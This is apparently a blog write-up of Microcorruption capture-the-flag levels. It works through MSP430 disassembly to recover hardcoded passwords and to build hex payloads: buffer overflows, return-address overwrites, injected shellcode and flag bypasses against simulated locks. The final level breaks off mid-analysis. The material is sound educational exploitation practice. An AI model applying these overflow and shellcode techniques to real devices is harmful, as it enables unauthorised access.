+++
title = "Embedded Security CTF"
summary = "https://microcorruption.com/"
tags = [
	"RE",
	"Binary Exploitation"
]
date = "2020-01-22"
featured_image = "/CTFWriteUps/embeddedsecurity/images/embeddedsecurity.png"
+++

## New Orleans
![](/CTFWriteUps/embeddedsecurity/images/neworleans.png)

### Reconnaissance
I start by checking the `<main>` function to get an overview of the program's flow.
```plaintext
4438 <main>
4438:  3150 9cff      add	#0xff9c, sp
443c:  b012 7e44      call	#0x447e <create_password>
4440:  3f40 e444      mov	#0x44e4 "Enter the password to continue", r15
4444:  b012 9445      call	#0x4594 <puts>
4448:  0f41           mov	sp, r15
444a:  b012 b244      call	#0x44b2 <get_password>
444e:  0f41           mov	sp, r15
4450:  b012 bc44      call	#0x44bc <check_password>
4454:  0f93           tst	r15
4456:  0520           jnz	#0x4462 <main+0x2a>
4458:  3f40 0345      mov	#0x4503 "Invalid password; try again.", r15
445c:  b012 9445      call	#0x4594 <puts>
4460:  063c           jmp	#0x446e <main+0x36>
4462:  3f40 2045      mov	#0x4520 "Access Granted!", r15
4466:  b012 9445      call	#0x4594 <puts>
446a:  b012 d644      call	#0x44d6 <unlock_door>
446e:  0f43           clr	r15
4470:  3150 6400      add	#0x64, sp
```
This call to `<check_password>` looks promising.
```plaintext
44bc <check_password>
44bc:  0e43           clr	r14
44be:  0d4f           mov	r15, r13
44c0:  0d5e           add	r14, r13
44c2:  ee9d 0024      cmp.b	@r13, 0x2400(r14)
44c6:  0520           jne	#0x44d2 <check_password+0x16>
44c8:  1e53           inc	r14
44ca:  3e92           cmp	#0x8, r14
44cc:  f823           jne	#0x44be <check_password+0x2>
44ce:  1f43           mov	#0x1, r15
44d0:  3041           ret
44d2:  0f43           clr	r15
44d4:  3041           ret
```
The first `cmp.b @r13, 0x2400(r14)` looks pretty suspicious, it's comparing some location in memory with a
a value that is referenced by the address stored in `r13`. Let's place a breakpoint on this and check the memory.
After the breakpoint hits i check the registers and memory...
```plaintext
<register state>
r13 439c

<memory dump>
2400:   665f 7e6a 425a 4900   f_~jBZI.
.
.
.
4398:   ba44 5444 6161 6161   .DTDaaaa
43a0:   6262 6262 0000 0000   bbbb....
```
The registers show r13 is referencing `0x439c`, this address points to a region in memory that holds the first char of my input `aaaabbbb`. 
The memory region that the input is being compared against, `0x2400`, points to the
first character of `f_~jBZI`. That is most likely the password being stored in memory. I input the suspect password into the lock and...

![](/CTFWriteUps/embeddedsecurity/images/neworleanssolvealt.png)
### Solution
The password is hardcoded into memory. Hit a breakpoint on `cmp.b	@r13, 0x2400(r14)`.
Then inspect the memory region that is referenced at `0x2400` to find the password.  
flag = `f_~jBZI`

## Sydney
![](/CTFWriteUps/embeddedsecurity/images/sydney.png)

### Reconnaissance
According to the manual they removed the password from memory. I can see that `<check password>`
is still being called from main, let's investigate...
```plaintext
<check_password>
448a:  bf90 5b76 0000 cmp	#0x765b, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 4c29 0200 cmp	#0x294c, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 2357 0400 cmp	#0x5723, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 7060 0600 cmp	#0x6070, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
44ac:  0e43           clr	r14
44ae:  0f4e           mov	r14, r15
44b0:  3041           ret
```
They are right, the password is not stored in memory, instead it looks like the password
is written as part of the function.
```plaintext
cmp	#0x765b, 0x0(r15
cmp	#0x294c, 0x2(r15)
cmp	#0x5723, 0x4(r15)
cmp	#0x6070, 0x6(r15)
```
Since the password is written into the function, it can be constructed by joining together the values that it is being `cmp` against.
Remembering to consider [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html), the password is `5b764c2923577060`.

![](/CTFWriteUps/embeddedsecurity/images/sydneysolve.png)

### Solution
The password is written as part of the function. Parse together the password in respect to the order the function
performs it's checks. Don't forget about [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html).  
flag = `5b764c2923577060`

## Hanoi
![](/CTFWriteUps/embeddedsecurity/images/hanoi.png)

### Reconnaissance
The password is not stored in the lock, but instead stored in the HSM-1. Because of this, they completely changed
how the password is handled. Checking the disassembly, there are many new functions. The `<main>` goes right
into `<login>`, which holds most of the logic.
```plaintext
4520 <login>
4520:  c243 1024      mov.b	#0x0, &0x2410
4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
4528:  b012 de45      call	#0x45de <puts>
452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
4530:  b012 de45      call	#0x45de <puts>
4534:  3e40 1c00      mov	#0x1c, r14
4538:  3f40 0024      mov	#0x2400, r15
453c:  b012 ce45      call	#0x45ce <getsn>
4540:  3f40 0024      mov	#0x2400, r15
4544:  b012 5444      call	#0x4454 <test_password_valid>
4548:  0f93           tst	r15
454a:  0324           jz	$+0x8
454c:  f240 1c00 1024 mov.b	#0x1c, &0x2410
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 fa00 1024 cmp.b	#0xfa, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret
```
Quite a few new functions, let's start by checking `<test_password_valid>`...
```plaintext
4454 <test_password_valid>
4454:  0412           push	r4
4456:  0441           mov	sp, r4
4458:  2453           incd	r4
445a:  2183           decd	sp
445c:  c443 fcff      mov.b	#0x0, -0x4(r4)
4460:  3e40 fcff      mov	#0xfffc, r14
4464:  0e54           add	r4, r14
4466:  0e12           push	r14
4468:  0f12           push	r15
446a:  3012 7d00      push	#0x7d
446e:  b012 7a45      call	#0x457a <INT>
4472:  5f44 fcff      mov.b	-0x4(r4), r15
4476:  8f11           sxt	r15
4478:  3152           add	#0x8, sp
447a:  3441           pop	r4
447c:  3041           ret
```
There's a call to `<INT>` here. Calls to `<INT>` are software interrupts, where the program hands off
execution to an outside event. There many different types of interrupts depending on what arguments are passed,
in this case `0x7d` is being passed. Checking the provided [manual](https://microcorruption.com/manual.pdf), it's
noted that `0x7d` refers to handing the execution off to the HSM-1. The HSM-1 then checks the password and if it's valid, sends back
a flag. It won't be easy to extract the password from the device. The solution must lie somewhere else...

Most of the static analysis is done and i'm not any closer to a solution. So it's time to run the program to see how the lock handles the password. The lock asks for
a password length between 8-16, it's a good habit to try to break the rules and see how programs deal with errors.
I gave the lock the password `aaaabbbbccccddddeeeeffff`. A recognizable pattern of characters makes for an easy time searching for 
it in memory. Setting a breakpoint at...
```plaintext
4548:  0f93           tst	r15
```
Which is just after the call to `<test_password_valid>`. After stepping a few times i notice something interesting...
```plaintext
455a:  f290 fa00 1024 cmp.b	#0xfa, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
```
It's performing a `cmp` with a value stored in the region `0x2410`. Checking what's being accessed in the region...
```plaintext
2410:   6565 6565 6666 6666   eeeeffff
```
The value being referenced at `0x2410` is `e`, more specifically it is the first `e` from the password that was given
`aaaabbbbccccddddeeeeffff`. How unfortunate, since the program is using a region in memory that is accessible through
the password, that means i have full control over that value. I can now hijack the the program. Continuing
from the `cmp` is a `jne` that jumps to the end of the function if the `cmp` is not equal. But if it is equal, which i can control, the flow
continues straight to unlock the door. I know what i must do...

![](/CTFWriteUps/embeddedsecurity/images/hanoisolve.png)

### Solution
The lock suffers from an overflow vulnerability. The program reads from a point in memory that is accessible by
the user through the password field. Use enough characters to overwrite the region where the value, `0xfa`, is stored. Which
then redirects the program to open the lock. Since `0xfa` is a hex value, the password needs to be
submitted as a hex encoded string.  
flag = `61616161626262626363636364646464fa`

## Cusco
![](/CTFWriteUps/embeddedsecurity/images/cusco.png)

### Reconnaissance
According to the manual, they removed the conditional flag that was being overwritten by passwords
that were too long. They failed to mention fixing the overflow vulnerability, which was the actual problem. In that
case let's start off by testing an extra long password `aaaabbbbccccddddeeeeffff`.
```plaintext
insn address unaligned
```
The debugger complains about accessing an address that is outside it's designated region. Checking the instruction
pointer...
```plaintext
pc  6565
```
The debugger tried to execute the address `0x6565`, which looks very similar to the characters in the password `ee`.
It seems the overflow vulnerability still exist, which is fortunate or unfortunate depending on how you look at it.
Since the lock tried to execute from an address that was referenced from the password, that means i have control
over the instruction pointer. This vulnerability is more severe then that last one. In Hanoi,
i only had access to a single flag in memory, but here i have access to an address. With full control of the instruction pointer i am free
to jump to any point in the program, ideally one that unlocks the door. Let's find out which one!
```plaintext
4500 <login>
4500:  3150 f0ff      add	#0xfff0, sp
4504:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
4508:  b012 a645      call	#0x45a6 <puts>
450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4510:  b012 a645      call	#0x45a6 <puts>
4514:  3e40 3000      mov	#0x30, r14
4518:  0f41           mov	sp, r15
451a:  b012 9645      call	#0x4596 <getsn>
451e:  0f41           mov	sp, r15
4520:  b012 5244      call	#0x4452 <test_password_valid>
4524:  0f93           tst	r15
4526:  0524           jz	#0x4532 <login+0x32>
4528:  b012 4644      call	#0x4446 <unlock_door>
452c:  3f40 d144      mov	#0x44d1 "Access granted.", r15
4530:  023c           jmp	#0x4536 <login+0x36>
4532:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4536:  b012 a645      call	#0x45a6 <puts>
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
```
Checking out the login function, i see a call to `<unlock_door>` at `0x4528`. Pretty straight forward from here,
submit a password of appropriate length with the address i want to jump to and...

![](/CTFWriteUps/embeddedsecurity/images/cuscosolve.png)

### Solution
The lock is weak to a buffer overflow attack. Make a password of sufficient length and appended the address that
redirects the program to unlock the door, in this case that address is `0x4528`, don't forget about [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html)  
flag = `616161616262626263636363646464642845`

## Reykjavik
![](/CTFWriteUps/embeddedsecurity/images/reykjavik.png)

### Reconnaissance
They're moving on to military grade encryption, sounds scary. Assuming they are serious, reversing the 
encryption will prove fairly strenuous and difficult. It's generally better to look for a weakness
in the way the algorithm is implemented. Starting with `<main>`...
```plaintext
4438 <main>
4438:  3e40 2045      mov	#0x4520, r14
443c:  0f4e           mov	r14, r15
443e:  3e40 f800      mov	#0xf8, r14
4442:  3f40 0024      mov	#0x2400, r15
4446:  b012 8644      call	#0x4486 <enc>
444a:  b012 0024      call	#0x2400
444e:  0f43           clr	r15
```
It's a pretty short function, only two calls, one to `<enc>` which i can only assume is the encryption algorithm
and the other call's from specific region of memory that hasn't been initialized. Let's go ahead and set a breakpoint
on the `call 0x2400` and check what's there.

There's quite a lot in the memory and nothing particularly stands out. One thing to note, is
upon executing, the password has not been asked for yet. The only instruction left is the call to the unmapped
region. Running the debugger again and...

![](/CTFWriteUps/embeddedsecurity/images/reykjavikpassword.png)
There's the request for the password. I'll use the standard `aaaabbbbccccddddeeeeffff` password and instead of
running immediately, i'm going to step memory.
```plaintext
2478:   3241 3041 d21a 189a   2A0A....
```
Stepping out of the prompt, i'm dumped at `0x2478`. Stepping carefully
i exit the current function. I notice the return address at `0x246b` sends me back to main. So the
unmapped function starts at `0x2400` and ends at `0x246b`. Copying the memory dump of this region,
then pasting it into a disassembler, i can parse instructions from the hex which can give some information on how this function behaves.
```plaintext
0b12 0412 0441 2452
3150 e0ff 3b40 2045 
073c 1b53 8f11 0f12   
0312 b012 6424 2152 
6f4b 4f93 f623 3012   
0a00 0312 b012 6424  
2152 3012 1f00 3f40   
dcff 0f54 0f12 2312   
b012 6424 3150 0600   
b490 cc34 dcff 0520   
3012 7f00 b012 6424   
2153 3150 2000 3441   
3b41 3041 1e41
```
This is the hex dump of the function. When placed in the [disassembler](https://microcorruption.com/assembler) provided...
```plaintext
0b12           push	r11
0412           push	r4
0441           mov	sp, r4
2452           add	#0x4, r4
3150 e0ff      add	#0xffe0, sp
3b40 2045      mov	#0x4520, r11
073c           jmp	$+0x10
1b53           inc	r11
8f11           sxt	r15
0f12           push	r15
0312           push	#0x0
b012 6424      call	#0x2464
2152           add	#0x4, sp
6f4b           mov.b	@r11, r15
4f93           tst.b	r15
f623           jnz	$-0x12
3012 0a00      push	#0xa
0312           push	#0x0
b012 6424      call	#0x2464
2152           add	#0x4, sp
3012 1f00      push	#0x1f
3f40 dcff      mov	#0xffdc, r15
0f54           add	r4, r15
0f12           push	r15
2312           push	#0x2
b012 6424      call	#0x2464
3150 0600      add	#0x6, sp
b490 cc34 dcff cmp	#0x34cc, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f
b012 6424      call	#0x2464
2153           incd	sp
3150 2000      add	#0x20, sp
3441           pop	r4
3b41           pop	r11
3041           ret
```
The hex dump now becomes fairly readable. While inspecting the code something immediately pops out at me.
```plaintext
3012 7f00      push	#0x7f
b012 6424      call	#0x2464
```
From the provided lock it [manual](https://microcorruption.com/manual.pdf), i recognize that `0x7f` is 
an argument that can be passed to `<INT>` to get an unlock door interrupt. That means that we can rewrite it to...
```plaintext
3012 7f00      push	#0x7f
b012 6424      call	<INT>
````
and by following the program flow back a bit i can see that...
```plaintext
b490 cc34 dcff cmp	#0x34cc, -0x24(r4)
0520           jnz	$+0xc
```
This `cmp` controls when to call for the door to unlock. It's checking at an offset of `-0x24(r4)`,
which is assumed to be where the users input is stored, and checking it against the value `0x34cc`, which is the password? Let's
run it and find out...

![](/CTFWriteUps/embeddedsecurity/images/reykjaviksolve.png)

### Solution
The encryption algorithm would take an unfair amount of labor to reverse. Turns out the obfuscated code
is dumped into memory first before being executed. Map the region of memory that the code is dumped to using
a disassembler of choice and analyze the function. Turns out the password was hardcoded into the function, extracting
the password became trivial after that. Don't forget about [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html)!  
flag = `0x34cc`

## Whitehorse
![](/CTFWriteUps/embeddedsecurity/images/whitehorse.png)

### Reconnaissance
Apparently they upgrade the security module and updated the software so that the deadbolt function can not be
called. It seems they still have not addressed the overflow vulnerability, which will be the first thing i'll
check.

Running the debugger, while using a sufficiently long password `aaaabbbbccccddddeeeeffff`, did result in an error.
```plaintext
insn address unaligned
```
This is a good sign that the program's weakness to buffer overflow is still here. Checking the instruction pointer...
```plaintext
pc  6565
````
reveals the length of the password needs to be near where the `ee` characters are. Knowing this, it's time to check the 
how the program behaves.
```plaintext
44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call	#0x4596 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 9645      call	#0x4596 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  0f41           mov	sp, r15
450e:  b012 8645      call	#0x4586 <getsn>
4512:  0f41           mov	sp, r15
4514:  b012 4644      call	#0x4446 <conditional_unlock_door>
4518:  0f93           tst	r15
451a:  0324           jz	#0x4522 <login+0x2e>
451c:  3f40 c544      mov	#0x44c5 "Access granted.", r15
4520:  023c           jmp	#0x4526 <login+0x32>
4522:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4526:  b012 9645      call	#0x4596 <puts>
452a:  3150 1000      add	#0x10, sp
452e:  3041           ret
```
There seems to be a new function `<conditional_unlock_door>`, let's check it out...
```plaintext
4446 <conditional_unlock_door>
4446:  0412           push	r4
4448:  0441           mov	sp, r4
444a:  2453           incd	r4
444c:  2183           decd	sp
444e:  c443 fcff      mov.b	#0x0, -0x4(r4)
4452:  3e40 fcff      mov	#0xfffc, r14
4456:  0e54           add	r4, r14
4458:  0e12           push	r14
445a:  0f12           push	r15
445c:  3012 7e00      push	#0x7e
4460:  b012 3245      call	#0x4532 <INT>
4464:  5f44 fcff      mov.b	-0x4(r4), r15
4468:  8f11           sxt	r15
446a:  3152           add	#0x8, sp
446c:  3441           pop	r4
446e:  3041           ret
```
The function doesn't seem to have any checks and has one call to `<INT>` with the value `0x7e` passed to it.
Checking the lockit [manual](https://microcorruption.com/manual.pdf). It's shown that `0x7f` hands execution
off to the HSM-2 where it checks the password and opens the door. The notes were indeed accurate, they successfully removed
means to open the door from lock. From the previous challenges i know that `<INT>` can have a variety of uses depending
on what is passed to it, for example `0x7f` sends a command to unlock the deadbolt. There might be a way to push
the correct argument and jump to the function.

The plan is, using the size of the password as a buffer, i will inject code into the string to run
commands. The command that i want to run is...
```plaintext
3012 7e00      push	#0x7f
b012 3245      call	#0x4532 <INT>
```
The code will run from the password input.
```plaintext
3e30:   6161 6161 6262 6262 6363 6363 6464 6464   aaaabbbbccccdddd
3e40:   6565 6565 6666 6666 0000 0000 0000 0000   eeeeffff........
```
The input starts at `0x3e30` or using little endian `0x303e`.
Next is to find at what character does the input overwrite, which was already determined by checking the
instruction pointer during the crash. I will use the first `ee` of the password to redirect the program.
```plaintext
aaaabbbbccccdddd303e
```
then using the hex representation of the code that i want to inject, `3012 7e00 b012 3245`, i'll append that to the start
of the password.
```plaintext
30127e00b0123245ccccdddd303e
```
Finally i encode the rest of the characters to hex...
```plaintext
30127f00b01232456363636364646464303e
``` 
and executing the shell...

![](/CTFWriteUps/embeddedsecurity/images/whitehorsesolve.png)

### Solution
The lock is still vulnerable to a buffer overflow attack. The key to the challenge is that the function that unlocks
the door is not directly called. So by creating a shell and using a buffer overflow to redirect the program to the shell.
Custom code can be executed that allows for full control of the lock.  
flag = `30127f00b01232456363636364646464303e`

## Montevideo
![](/CTFWriteUps/embeddedsecurity/images/montevideo.png)

### Reconnaissance
Rewritten the code? Sounds like they may have addressed they overflow vulnerability now. Only way to find out is to 
give it a try! Using an appropriately long password `aaaabbbbccccddddeeeeffff`...
```plaintext
insn address unaligned
pc  6565
```
Nope! Unfortunately the vulnerability still exists and from the address of the instruction pointer, `0x6565` or hex encoded `ee`,
the program is still being overwritten at the same region in memory. Let's check out what's actually new with the lock!
```plaintext
44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 b045      call	#0x45b0 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 b045      call	#0x45b0 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn>
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
452c:  0f41           mov	sp, r15
452e:  b012 4644      call	#0x4446 <conditional_unlock_door>
4532:  0f93           tst	r15
4534:  0324           jz	#0x453c <login+0x48>
4536:  3f40 c544      mov	#0x44c5 "Access granted.", r15
453a:  023c           jmp	#0x4540 <login+0x4c>
453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4540:  b012 b045      call	#0x45b0 <puts>
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret
```
There's two new functions added, [strcpy](http://www.cplusplus.com/reference/cstring/strcpy/) and [memset](http://www.cplusplus.com/reference/cstring/memset/?kw=memset).
`<memset>` does not cause any concerns, but `<strcpy>` does. Since `<strcpy>` is checking for null characters `00` and terminating on them, it adds
a level of restriction to the code that can be written. With some clever work, it could still
be possible to write some applicable shell code to hijack the locks functions. Let's go ahead and run the debugger
and see how `<strcpy>` handles the password. I set a breakpoint at `0x451e`, which is right after `<strcpy>` is called, then run the debugger with the password `aaaabbbbccccddddeeeeffff`.

While inspecting the memory, i see that the input i gave is located in two different regions in memory. One
location at `0x2400` and the other location at `0x43ee`. I know that [strcpy](http://www.cplusplus.com/reference/cstring/strcpy/) takes two
arguments, a destination and a source, respectively.
```plaintext
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
```
In disassembly arguments are passed in reverse order, so `mov 0x2400, r14` is passing a source and `mov sp, r15`
is passing the destination. An interesting thing to note is that the stack pointer `sp  43ee` is passed as the destination.
Checking the stack, it can be seen that the password has completely filled the `<login>`'s stack frame, overwriting
the return address.
```plaintext
<normal>
43e8:   0024 3000 1e45 6161   .$0..Eaa
43f0:   6161 6262 6262 6363   aabbbbcc
43f8:   6363 0000 0000 3c44   cc....<D
4400:   3140 0044 1542 5c01   1@.D.B\.
```
```plaintext
<overwritten>
43e8:   0024 3000 1e45 6161   .$0..Eaa
43f0:   6161 6262 6262 6363   aabbbbcc
43f8:   6363 6464 6464 6565   ccddddee
4400:   6565 6666 6666 0001   eeffff..
```
These are different stack frames for `<login>`. In `<normal>` the password is within the requested
parameters, here the frame ends at `0x43fe` with the return address `0x443c`, which is the next address
after `<main>`. While in `<overwritten>`, at the same location on the stack, `0x43fe` is filled
with `0x6565` or `ee`. Not only is the return address on the `<login>` frame being overwritten, so is the
region beyond that. This is a stack overflow, a special case of buffer overflow. With that, it's possible to "push"
values on the stack by directly writing on the stack rather then invoking a `push` command.

To take advantage of this, let's look at `<INT>`...
```plaintext
454c <INT>
454c:  1e41 0200      mov	0x2(sp), r14
4550:  0212           push	sr
4552:  0f4e           mov	r14, r15
4554:  8f10           swpb	r15
4556:  024f           mov	r15, sr
4558:  32d0 0080      bis	#0x8000, sr
455c:  b012 1000      call	#0x10
4560:  3241           pop	sr
4562:  3041           ret
```
The first line...
```plaintext
454c:  1e41 0200      mov	0x2(sp), r14
```
Here it references a value from the stack with an offset of `0x2` from the stack pointer. Given that i have control
of the program when entering this function, i can use the stack overflow to place the value that i want at this
location.

### Solution
I will use a stack overflow attack to overwrite the return address and write an argument directly onto the stack.
The function that i will jump to will be `<INT>` and i will write `0x7f` on the stack at a location `0x2` from the 
return value.
 
flag = `616161616262626263636363646464644c4565657f`

## johannesburg
![](/CTFWriteUps/embeddedsecurity/images/johannesburg.png)

### Reconnaissance
Looks like they finally are trying to deal with the overflow vulnerability that's been plaguing these
series of locks. Apparently the lock will now reject passwords that are too long, let's test and see how true
that is...
```plaintext
Invalid Password Length: password too long.
```
Using the password `aaaabbbbccccddddeeeeffff` the console spits out an error. It does indeed seem like they have
made an attempt to address the problem.

Let's checkout the function and see how the password length is being handled.
```plaintext
452c <login>
452c:  3150 eeff      add	#0xffee, sp
4530:  f140 4200 1100 mov.b	#0x42, 0x11(sp)
4536:  3f40 7c44      mov	#0x447c "Enter the password to continue.", r15
453a:  b012 f845      call	#0x45f8 <puts>
453e:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
4542:  b012 f845      call	#0x45f8 <puts>
4546:  3e40 3f00      mov	#0x3f, r14
454a:  3f40 0024      mov	#0x2400, r15
454e:  b012 e845      call	#0x45e8 <getsn>
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
455c:  0f41           mov	sp, r15
455e:  b012 5244      call	#0x4452 <test_password_valid>
4562:  0f93           tst	r15
4564:  0524           jz	#0x4570 <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	#0x4574 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 4200 1100 cmp.b	#0x42, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```
Starting at `0x4580` where a string reference to `"Invalid Password Length: password too long."` is made. I work backwards
and take notes on the the program's flow. I notice `cmp.b	#0x42, 0x11(sp)`, which seems to be a check for a
value on the stack, probably checking to see if a value has been overwritten. Let's set a breakpoint at `0x4578` and run the debugger to see what
is being referenced.
```plaintext
43e8:   0000 7845 6161 6161   ..xEaaaa
43f0:   6262 6262 6363 6363   bbbbcccc
43f8:   6464 6464 6565 6565   ddddeeee
4400:   6666 6666 0042 5c01   ffff.B\.
```
```plaintext
sp 43ec
```
The stack pointer is at `0x43ec`, the value that the program is checking is at `0x11(sp)`. So that
`0x43ec + 0x11 = 0x43fd`. Checking that address i can see that the value stored there is `0x65` or `e`. More specifically
this region has also been written over by the password, so i have full control over what values can be placed there.

With control over the password length flag, It's just a matter of finding what function to hijack. Checking the main
function i can see`<unlock_door>` is being used again. So it's just a matter of constructing a password
with the flag embedded at the correct spot and...

![](/CTFWriteUps/embeddedsecurity/images/johannesburgsolve.png)

### Solution
The lock does not completely deal with the buffer overflow, rather the lock sets a flag in memory
and then checks if that flag has been overwritten. Unfortunately, this check was poorly implemented,
the flag isn't correctly set in memory. The flag is set at a specific region on `<login>`'s stack frame, this did not account for
the size of the stack changing depending on the amount of memory that is allocated by `<strcpy>`'s frame. As a result the flag is not
actually getting overwritten but merely shifted over by a few bytes, regardless the function only checks a static
location of the stack which can be exploited.

flag = `6161616162626262636363636464646465424644`

## Santa Cruz
![](/CTFWriteUps/embeddedsecurity/images/santacruz.png)

### Reconnaissance
Sounds like they will continue to use checks for length to detect overflows. Let's go ahead and run the lock and
see how it behaves.
```plaintext
Authentication now requires a username and password.
Remember: both are between 8 and 16 characters.
Please enter your username:
```
They added another form of authentication, i will treat this field the same as the password and use
`AAAABBBBCCCCDDDDEEEEFFFF` as the username. Being slightly different from the password `aaaabbbbccccddddeeeeffff`
allows it to be easier to distinguish. After filling in both fields and running the program i get...
```plaintext
Invalid Password Length: password too short.
```
The password definitely isn't too short, which means it's an error caused by something getting overwritten.
let's inspect the memory where the username and password are stored.
```plaintext
43a0:   0000 4141 4141 4242   ..AAAABB
43a8:   4242 4343 4343 4444   BBCCCCDD
43b0:   4444 4545 4561 6161   DDEEEaaa
43b8:   6162 6262 6263 6363   abbbbccc
43c0:   6364 6464 6465 6565   cddddeee
43c8:   6566 6666 6600 0000   effff...
```
This is the memory dump after `<strcpy>` completes. Nothing immediately stands out, the username writes into the region where the password will get stored.
Causing part of the username to get overwritten if it's too long. Nothing here hints as to what may have caused the
error. Let's continue to step through the function to see what checks are made.
```plaintext
45d8:  1e53           inc	r14
45da:  ce93 0000      tst.b	0x0(r14)
45de:  fc23           jnz	#0x45d8 <login+0x88>
45e0:  0b4e           mov	r14, r11
45e2:  0b8f           sub	r15, r11
```
This loop iterates through all the characters from the username field while checking for `00`, the terminating null
byte that is appended at the end of a string by [strcpy](http://www.cplusplus.com/reference/cstring/strcpy/). Each
iteration the loop keeps track of the location in memory and once the null byte is found subtracts the start from the finish
and records it. This loop is determining the length of the input, which is then stored in `r11`. Continuing on...
```plaintext
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	#0x45fa <login+0xaa>
```
A value stored at `-0x18(r4)` or `0x43b2` is being moved to `r15`, then `r15` gets compared to the length. Right now
the value in `r15` is `0x45` or `E`. Which is one of the characters from the username field. The `jnc` jumps if the
carry flag is not set, in other words it's checking if `r15` is greater then `r11`. Failing this check terminates 
control of the lock immediately. Luckily that was not the case and i can continue...
```plaintext
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	#0x4610 <login+0xc0>
```
The function is passing a value of `0x45` or `E` from the location `-0x19(r4)`, `0x43b3`. This value also comes from the
username field that was given, which means i also have control of this flag. Then it compares this value to the length
and checks if the length is smaller. Naturally this check fails and the lock terminates. Since i have control of this
flags, lets force these checks in my favor and try again.

I know the flags are pulling the value `E` from the username field, specifically it's using locations [1], [2]...
```plaintext
AAAABBBBCCCCDDDDE[1][2]EFFFF
```
I know that the value at [1] is checking if the length is greater than and at value [2] it's checking that it's less than.
so let's just use values that will always be true. [1] can be `0x01` and [2] can be `0xff`. I'm not using `0x00` because
the lock uses [strcpy](http://www.cplusplus.com/reference/cstring/strcpy/) which terminates the copy operation on reading
a null byte. The new username now becomes...
```plaintext
414141414242424243434343444444444501ff4546464646
```
The password is hex encoded because i am using hex values to patch the flags. I'll set a breakpoint at `0x4610`, right
where the second check jumps to on success, and go ahead and run the lock with the new username...

Success! The patch has overwritten the flags and a password of any length can be used. Let's continue to step through
the lock and see what happens.
```plaintext
462a:  3012 7d00      push	#0x7d
462e:  b012 c446      call	#0x46c4 <INT>
4632:  3152           add	#0x8, sp
4634:  c493 d4ff      tst.b	-0x2c(r4)
4638:  0524           jz	#0x4644 <login+0xf4>
```
Although not immediately obvious, this section checks if the password is correct.
Here is a call to `<INT>`, a system interrupt,  where `0x7d` is passed to it to determine where to hand off execution.
In this case, checking the [manual](https://microcorruption.com/manual.pdf), `0x7d` passes execution over to the HSM-1
so that it can check if the password is correct. Without having access to the HSM-1, this check will always fail, the solution
isn't to find the password, but rather to find a weakness in the implementation of the check.
```plaintext
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>
```
This is interesting, there is one final check right before the lock ends. The memory region the lock is checking, `-0x6(r4)` or `0x43c6`,
is where the password is stored, specifically it's referencing...
```plaintext
aaaabbbbccccdddde[1]
```
